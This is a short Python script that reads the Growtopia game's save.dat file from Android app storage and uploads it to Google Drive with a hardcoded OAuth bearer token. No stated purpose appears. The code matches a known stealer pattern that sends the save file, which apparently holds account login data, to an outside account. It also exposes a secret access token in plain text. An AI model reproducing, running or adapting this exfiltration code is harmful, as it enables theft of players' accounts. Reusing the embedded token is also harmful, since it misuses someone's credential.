import json
import requests
def fucxy():
    headers = {"Authorization": "Bearer ya29.a0AfH6SMCVBUSjCLT1ANXtkZc9ggonKAaFP-VmRovO5sLUI5FrpGTgl52Bh9SAdqSRmPP9vXLeLpCIS1UqpdMKgDBmj3E33hl7NFoVEtAAZKHbeaza8-Bv8WoOzsrmWu034TbDJaZGEmGXMVPNoeKX_pw4EJIa"}
    para = {
        "name": "saved.dat",
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )


